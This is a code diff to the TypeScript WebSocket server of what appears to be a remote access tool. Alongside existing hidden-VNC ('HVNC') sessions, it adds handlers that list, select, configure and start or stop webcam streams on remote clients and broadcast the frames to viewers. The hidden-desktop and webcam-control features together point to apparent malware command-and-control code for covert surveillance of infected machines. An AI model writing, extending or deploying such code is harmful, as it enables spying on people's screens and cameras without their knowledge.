@@ -194,7 +194,7 @@ export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
     return;
   }
-  safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
+  safeSendViewer(ws, { type: "status", status: "online", sessionId });
 }
 
 export function notifyRemoteDesktopStatus(clientId: string, status: string, reason?: string) {
@@ -385,6 +385,86 @@ function handleRemoteDesktopFrame(payload: any) {
 };
 
 export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
+export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean }>();
+
+export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
+  const { clientId } = ws.data;
+  const sessionId = uuidv4();
+  const target = clientManager.getClient(clientId);
+  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
+  sessionManager.getAllWebcamSessions().set(sessionId, session);
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    return;
+  }
+  safeSendViewer(ws, { type: "status", status: "online", sessionId });
+  sendDesktopCommand(target, "webcam_list", {});
+}
+
+export function handleWebcamDevices(clientId: string, payload: any) {
+  for (const session of sessionManager.getAllWebcamSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewer(session.viewer, payload);
+  }
+}
+
+export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
+  const payload = decodeViewerPayload(raw);
+  if (!payload || typeof payload.type !== "string") return;
+  const { clientId } = ws.data;
+  const target = clientManager.getClient(clientId);
+  if (!target) {
+    safeSendViewer(ws, { type: "status", status: "offline" });
+    return;
+  }
+
+  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false };
+  switch (payload.type) {
+    case "webcam_list":
+      sendDesktopCommand(target, "webcam_list", {});
+      break;
+    case "webcam_select": {
+      const index = Math.max(0, Number(payload.index) || 0);
+      state.deviceIndex = index;
+      webcamStreamingState.set(clientId, state);
+      sendDesktopCommand(target, "webcam_select", { index });
+      if (state.isStreaming) {
+        sendDesktopCommand(target, "webcam_stop", {});
+        sendDesktopCommand(target, "webcam_start", {});
+      }
+      break;
+    }
+    case "webcam_set_fps": {
+      if (state.isStreaming) {
+        safeSendViewer(ws, { type: "status", status: "error", reason: "Stop stream before changing FPS" });
+        break;
+      }
+      const fps = Math.max(1, Math.min(120, Number(payload.fps) || 30));
+      const useMax = !!payload.useMax;
+      state.fps = fps;
+      state.useMax = useMax;
+      webcamStreamingState.set(clientId, state);
+      sendDesktopCommand(target, "webcam_set_fps", { fps, useMax });
+      break;
+    }
+    case "webcam_start":
+      if (!state.isStreaming) {
+        sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
+        sendDesktopCommand(target, "webcam_start", {});
+        state.isStreaming = true;
+        webcamStreamingState.set(clientId, state);
+      }
+      break;
+    case "webcam_stop":
+      sendDesktopCommand(target, "webcam_stop", {});
+      state.isStreaming = false;
+      webcamStreamingState.set(clientId, state);
+      break;
+    default:
+      break;
+  }
+}
 
 export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId } = ws.data;
@@ -511,6 +591,16 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
   let sent = false;
   for (const session of sessionManager.getAllHvncSessions().values()) {
+    if (session.clientId !== clientId) continue;
+    safeSendViewerFrame(session.viewer, bytes, header);
+    sent = true;
+  }
+  return sent;
+};
+
+(globalThis as any).__webcamBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  let sent = false;
+  for (const session of sessionManager.getAllWebcamSessions().values()) {
     if (session.clientId !== clientId) continue;
     safeSendViewerFrame(session.viewer, bytes, header);
     sent = true;
